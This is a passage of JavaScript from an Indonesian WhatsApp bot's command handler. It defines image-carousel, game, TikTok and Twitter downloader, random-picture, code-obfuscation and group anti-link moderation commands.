        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] 
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 5 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
case 'christy-jkt48': case 'christy': case 'christoy': {
if (banned.includes(m.sender)) {
    return;
    }
await loading ()
    const createImage = async (url) => {
        const { imageMessage } = await baileys.generateWAMessageContent({
            image: {
                url
            }
        }, {
            upload: KhaerulZx.waUploadToServer
        });
        return imageMessage;
    };
    async function pinterest(query) {
        let res = await fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
        let json = await res.json();
        let data = json.resource_response.data.results;
        if (!data.length) reply(`Query "${query}" not found :/`);
        return data[~~(Math.random() * data.length)].images.orig.url;
    }
    const imageUrls = [];
    for (let i = 0; i < 5; i++) {
        const imageUrl = await pinterest('Christy Jkt48');
        imageUrls.push(imageUrl);
    }
    const cards = await Promise.all(imageUrls.map(async (url, index) => ({
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: `Image ${index + 1}`,
            hasMediaAttachment: true,
            imageMessage: await createImage(url)
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            buttons: [] 
        })
    })));
    const msg = baileys.generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                    body: proto.Message.InteractiveMessage.Body.fromObject({
                        text: `> Batas 5 photo`
                    }),
                    carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                        cards
                    })
                })
            }
        }
    }, {});

    await KhaerulZx.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
};
break
case 'tebakjkt48': {
    let id = m.chat;

    if (id in tebakjkt48) return reply("Masih Ada Sesi Yang Belum Diselesaikan!");

    async function getTebakjkt48() {
        let anu = await fetchJson('https://api-zenith.koyeb.app/api/game/tebakjkt48?apikey=zenkey');
        let result = anu.soal;
        return {
            img_alt: result.img_alt,
            name: result.name,
            generation: result.generation
        };
    }

    let tos = await getTebakjkt48();

    let caption = `Silahkan Jawab Soal\nDeskripsi: ${tos.generation}\nWaktu: 60s\nHadiah: 5 limit`;

    tebakjkt48[id] = [
        await KhaerulZx.sendMessage(from, {caption: caption, image: {url: tos.img_alt}}, {quoted: m}),
        tos,
        setTimeout(() => {
            if (tebakjkt48[id]) {
                reply(`Waktu Habis\nJawaban:  ${tos.name}`);
                delete tebakjkt48[id];
            }
        }, 60000)
    ];
}
break;
case 'tebakbom': {
if (banned.includes(m.sender)) {
    return;
    }
if (!isRegistered) return reply(mess.regis)
				if (tebakbom[m.sender]) return m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
				function shuffle(array) {
					return array.sort(() => Math.random() - 0.5);
				}
				tebakbom[m.sender] = {
					petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
					board: ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '??'],
					bomb: 3,
					lolos: 7,
					pick: 0,
					nyawa: ['❤️', '❤️', '❤️'],
					waktu: setTimeout(() => {
						if (tebakbom[m.sender]) m.reply(`_Waktu ${command} habis_`)
						delete tebakbom[m.sender];
					}, 120000)
				}
				m.reply(`*TEBAK BOM*\n\n${tebakbom[m.sender].board.join("")}\n\nPilih lah nomor tersebut! dan jangan sampai terkena Bom!\nBomb : ${tebakbom[m.sender].bomb}\nNyawa : ${tebakbom[m.sender].nyawa.join("")}`);
			}
			break
    case 'petakbom':
    if (banned.includes(m.sender)) {
    return;
    }
    if (userdb.petakbom === true) return m.reply("masih ada session")
        if (m.sender in this.petakbom) {
            return reply(`Game mu masih belum terselesaikan, lanjutkan yukk\n\n${this.petakbom[m.sender].board2.join("")}\n\nKirim ${prefix}delpetakbom untuk menghapus game petak bom`);
        }

        function shuffle(array) {
            return array.sort(() => Math.random() - 0.5);
        }

        this.petakbom[m.sender] = {
            petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
            board2: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"],
            bomb2: 3,
            lolos2: 7,
            pick2: 0,
            nyawa2: ["❤️", "❤️"]
        };
        userdb.petakbom = true
        await m.reply(`*PETAK BOM*\n\n${this.petakbom[m.sender].board2.join("")}\n\nPilih lah nomor tersebut! dan jangan sampai terkena Bom!\nBomb : ${this.petakbom[m.sender].bomb2}\nNyawa : ${this.petakbom[m.sender].nyawa2.join("")}`);
        break;

    case 'delpetakbom':
    if (banned.includes(m.sender)) {
    return;
    }
        if (userdb.petakbom === false) return m.reply(`Kamu sedang tidak bermain petakbom!`);
        delete this.petakbom[m.sender];
        userdb.petakbom = false
        m.reply(`Permainan petakbom telah diakhiri.`);
        break;
/**
 * 
 * [ *CASE TIKTOKDOWN FULL DATA* ]
 * https://whatsapp.com/channel/0029Vaf07jKCBtxAsekFFk3i
 */

case 'tt4': {
if (banned.includes(m.sender)) {
    return;
    }
  //jangan hapus wm, ini hann
  let input = `[!] *wrong input*
	
Ex : ${prefix + command} https://vt.tiktok.com/ZSFSqcuXb/`
//jangan hapus wm, ini hann
    if (!text) return m.reply(input)
   //jangan hapus wm, ini hann 
  if (!(text.includes('http://') || text.includes('https://'))) return m.reply(`url invalid, please input a valid url. Try with add http:// or https://`)
    if (!text.includes('tiktok.com')) return m.reply(`Invalid Tiktok URL.`)
    //jangan hapus wm, ini hann
async function tiktokDl(url) {
	return new Promise(async (resolve, reject) => {
		try {
			let data = []
			function formatNumber(integer) {
				let numb = parseInt(integer)
				return Number(numb).toLocaleString().replace(/,/g, '.')
			}
			//jangan hapus wm, ini hann
			function formatDate(n, locale = 'en') {
				let d = new Date(n)
				return d.toLocaleDateString(locale, {
					weekday: 'long',
					day: 'numeric',
					month: 'long',
					year: 'numeric',
					hour: 'numeric',
					minute: 'numeric',
					second: 'numeric'
				})
			}
			//jangan hapus wm, ini hannn
			let domain = 'https://www.tikwm.com/api/';
			//jangan hapus wm, ini hann
			let res = await (await axios.post(domain, {}, {
				headers: {
					'Accept': 'application/json, text/javascript, */*; q=0.01',
					'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'Origin': 'https://www.tikwm.com',
					'Referer': 'https://www.tikwm.com/',
					'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
					'Sec-Ch-Ua-Mobile': '?1',
					'Sec-Ch-Ua-Platform': 'Android',
					'Sec-Fetch-Dest': 'empty',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
					'X-Requested-With': 'XMLHttpRequest'
				},
				params: {
					url: url,
					count: 12,
					cursor: 0,
					web: 1,
					hd: 1
				}
			})).data.data
			//jangan hapus wm, ini han
			if (res && !res.size && !res.wm_size && !res.hd_size) {
				res.images.map(v => {
					data.push({ type: 'photo', url: v })
				})
			} else {
			  //jangan hapus wm, ini hann
				if (res && res.wmplay) {
					data.push({ type: 'watermark', url: 'https://www.tikwm.com' + res.wmplay })
				}
				//jangan hapus wm, ini hannn
				if (res && res.play) {
					data.push({ type: 'nowatermark', url: 'https://www.tikwm.com' + res.play })
				}
				//jangan hapus wm, ini hannn
				if (res && res.hdplay) {
					data.push({ type: 'nowatermark_hd', url: 'https://www.tikwm.com' + res.hdplay })
				}
			}
			//jangan hapus wm, ini han
			let json = {
				status: true,
				title: res.title,
				taken_at: formatDate(res.create_time).replace('1970', ''),
				region: res.region,
				id: res.id,
				durations: res.duration,
				duration: res.duration + ' Seconds',
				cover: 'https://www.tikwm.com' + res.cover,
				size_wm: res.wm_size,
				size_nowm: res.size,
				size_nowm_hd: res.hd_size,
				data: data,
				music_info: {
					id: res.music_info.id,
					title: res.music_info.title,
					author: res.music_info.author,
					album: res.music_info.album ? res.music_info.album : null,
					url: 'https://www.tikwm.com' + res.music || res.music_info.play
				},
				stats: {
					views: formatNumber(res.play_count),
					likes: formatNumber(res.digg_count),
					comment: formatNumber(res.comment_count),
					share: formatNumber(res.share_count),
					download: formatNumber(res.download_count)
				},
				author: {
					id: res.author.id,
					fullname: res.author.unique_id,
					nickname: res.author.nickname,
					avatar: 'https://www.tikwm.com' + res.author.avatar
				}
			}
//scrape dari https://whatsapp.com/channel/0029VaW25g5F1YlKczMRmd1h
			resolve(json)
		} catch (e) {
			reject(e)
		}
	});
}
//jangan hapus wm, ini hann
let down = await tiktokDl(text)
//jangan hapus wm, ini hann
let berak = `[ *TIKTOK DOWNLOADER* ]

Videos:
${down.title}
${down.region}
${down.id}
${down.duration}
${down.size_nowm_hd}

Music Info:
${down.music_info.id}
${down.music_info.title}
${down.music_info.author}

Stats: 
${down.stats.views}
${down.stats.likes}
${down.stats.comment}
${down.stats.share}
${down.stats.download}

Author: 
${down.author.id}
${down.author.fullname}
${down.author.nickname}
${down.author.avatar}
`
//jangan hapus wm, ini hann
await KhaerulZx.sendMessage(m.chat, { video: { url: down.data[2].url }, caption: berak }, { quoted: m })
await KhaerulZx.sendMessage(m.chat, { audio: { url: down.music_info.url }, mimetype: "audio/mp4", ptt: true }, { quoted: m })
}
break
case 'tiktoknotnot':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokvids/notnot.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, video: { url: hasil.url }}, { quoted: m })
break
case 'chinese':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/china.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'hijab':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/hijab.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'indo':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/indonesia.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'japanese':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/japan.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'korean':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/korea.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'malay':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/malaysia.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomgirl':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'randomboy':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/random2.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'thai':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/thailand.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'vietnamese':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'aesthetic':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/aesthetic.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'antiwork':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/antiwork.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'blackpink':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/blackpink.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'bike':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/bike.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'boneka':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/boneka.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cosplay':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cosplay.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'cat':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/cat.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'doggo':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/doggo.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'justina':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/justina.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kayes':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kayes.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'kpop':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/kpop.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'notnot':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/notnot.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'car':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/car.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'profilepic':  case 'profilepicture':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/profile.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'pubg':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/pubg.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'rose':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/rose.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ryujin':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ryujin.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzangboy':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzangboy.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'ulzzanggirl':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/ulzzanggirl.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallml': case 'wallpaperml':case 'mobilelegend':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallml.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'wallpaperphone': case 'wallphone':
if (banned.includes(m.sender)) {
    return;
    }
await loading()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
KhaerulZx.sendMessage(m.chat, { caption: mess.success, image: { url: hasil.url } }, { quoted: m })
break
case 'family100': {
if (banned.includes(m.sender)) {
    return;
    }
  if (!m.isGroup) return reply(mess.only.group)
    let timeout = 60000
  let winScore = 10
 let id = m.chat
	if (id in KhaerulZx.family100) return reply('Masih Ada Sesi Yang Belum Diselesaikan!')
 let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
 let hasil = `*Jawablah Pertanyaan Berikut :*\n\nSoal : ${json.soal}\n\nHadiah : 10 limit\n\nTerdapat *${json.jawaban.length}* Jawaban ${json.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
 KhaerulZx.family100[id] = {
			id,
			msg: await reply(`${hasil}`),
			...json,
			terjawab: Array.from(json.jawaban, () => false),
      winScore,  
        }
}
break
case 'gombalan':{
if (banned.includes(m.sender)) {
    return;
    }
m.reply('Coba pencet link ini kak\nhttps://htmlku.com/taubedanya/main')
}
break
case 'twit': case 'twitter': 
if (banned.includes(m.sender)) {
    return;
    }
  if (!text) return m.reply('masukkan url twitter');
  try {
    let tw = await (await fetch('https://api.shannmoderz.xyz/downloader/twitter?url=' + text)).json();
    let shannz = tw.result.downloads[1];
    await KhaerulZx.sendMessage(m.chat, { video: { url: shannz.url }, caption: `*SUCCESS RESOLUSI ${shannz.text} *` },{ quoted: m });
} catch (e) {
    return m.reply('sedang error,' + e);
}
break
case 'twitter2': case 'twitterdl2': case 'twitterdl': {
if (banned.includes(m.sender)) {
    return;
    }
	if (!args[0]) return reply(`📌 Example : \n*${prefix + command}* https://twitter.com/fernandavasro/status/1569741835555291139?t=ADxk8P3Z3prq8USIZUqXCg&s=19`)
	if (!isUrl(args[0]) && !args[0].includes('x.com')) return reply('Link Invalid!')
          try {
          let { SD, HD, desc, thumb, audio } = await fg.twitter(args[0])
          let te = ` 
┌─⊷ *TWITTER DL*
▢ Description: ${desc}
└───────────`
KhaerulZx.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
} catch (e) {
  	reply(`Verify that the link is from Twitter`)
	}
}
break
case 'obfus': case 'obfuscate':{
if (banned.includes(m.sender)) {
    return;
    }
if (!q) return reply(`Example ${prefix+command} const xeonbot = require('baileys')`)
let meg = await obfus(q)
reply(`Success
${meg.result}`)
}
break
case 'autodownload':
if (banned.includes(m.sender)) {
    return;
    }
if (!isCreator&&!isPrem) return reply('Khusus Prem')
if (args[0] == 'on'){
if (global.autodonlod) return reply('sudah aktif!')
global.autodonlod = true
reply('mode auto download aktif')
} else if (args[0] == 'off'){
if (!global.autodonlod) return reply('sudah dimatikan!')
global.autodonlod = false
reply('mode auto download matikan')
} else reply('on / off')
break //Powered By conn & Darwin
/*case 'listgc': {
if (banned.includes(m.sender)) {
    return;
    }
let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
let teks = `*[ Group Chat ]*
Total: ${anulistg.length} Group\n\n`
for (let i of anulistg) {
let metadata = await KhaerulZx.groupMetadata(i)
teks += `∘ *Name* : ${metadata.subject}
∘ *Owner* : ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}
∘ *Id* : ${metadata.id}
∘ *Made* : ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}
∘ *Member* : ${metadata.participants.length}\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n`
}
KhaerulZx.sendTextWithMentions(m.chat, teks, m)
}
break */
case 'antivirus': case 'antivirtex': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiVirtex) return m.reply('_Sudah Diaktifkan_')
ntvirtex.push(from)
fs.writeFileSync('./database/enable/antivirus.json', JSON.stringify(ntvirtex))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await KhaerulZx.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
KhaerulZx.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nTidak ada orang yang diperbolehkan mengirim virus di grup ini, anggota yang mengirim akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiVirtex) return m.reply('_Sudah Dimatikan_')
let off = ntvirtex.indexOf(from)
ntvirtex.splice(off, 1)
fs.writeFileSync('./database/enable/antivirus.json', JSON.stringify(ntvirtex))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkyoutubevideo': case 'antilinkyoutubevid': case 'antilinkytvid': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeVid) return m.reply('_Sudah Diaktifkan_')
ntilinkytvid.push(from)
fs.writeFileSync('./database/enable/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await KhaerulZx.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
KhaerulZx.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link video youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeVid) return m.reply('_Sudah Dimatikan_')
let off = ntilinkytvid.indexOf(from)
ntilinkytvid.splice(off, 1)
fs.writeFileSync('./database/enable/antilinkytvideo.json', JSON.stringify(ntilinkytvid))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkyoutubech': case 'antilinkyoutubechannel': case 'antilinkytch': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkYoutubeChannel) return m.reply('_Sudah Diaktifkan_')
ntilinkytch.push(from)
fs.writeFileSync('./database/enable/antilinkytchannel.json', JSON.stringify(ntilinkytch))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await KhaerulZx.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
KhaerulZx.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirimkan link channel youtube di grup ini atau Anda akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkYoutubeChannel) return m.reply('_Sudah Dimatikan_')
let off = ntilinkytch.indexOf(from)
fs.writeFileSync('./database/enable/antilinkytchannel.json', JSON.stringify(ntilinkytch))
ntilinkytch.splice(off, 1)
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkinstagram': case 'antilinkig': case 'antilinkinsta': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkInstagram) return m.reply('_Sudah Diaktifkan_')
ntilinkig.push(from)
fs.writeFileSync('./database/enable/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await KhaerulZx.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
KhaerulZx.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim instagram link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkInstagram) return m.reply('_Sudah Dimatikan_')
let off = ntilinkig.indexOf(from)
ntilinkig.splice(off, 1)
fs.writeFileSync('./database/enable/antilinkinstagram.json', JSON.stringify(ntilinkig))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinkfacebook': case 'antilinkfb': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkFacebook) return m.reply('_Sudah Diaktifkan_')
ntilinkfb.push(from)
fs.writeFileSync('./database/enable/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply(`_Sukses aktifkan ${command} di group ini_`)
var groupe = await KhaerulZx.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
KhaerulZx.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nJika Anda bukan admin, jangan kirim facebook link di grup ini atau kamu akan langsung ditendang!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkFacebook) return m.reply('_Sudah Dimatikan_')
let off = ntilinkfb.indexOf(from)
ntilinkfb.splice(off, 1)
fs.writeFileSync('./database/enable/antilinkfacebook.json', JSON.stringify(ntilinkfb))
m.reply(`_Sukses matikan ${command} di group ini_`)
} 
}
break
//=================================================//
case 'antilinktelegram': case 'antilinktg': {
if (banned.includes(m.sender)) {
    return;
    }
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiLinkTelegram) return m.reply('_Sudah Diaktifkan_')
ntilinktg.push(from)
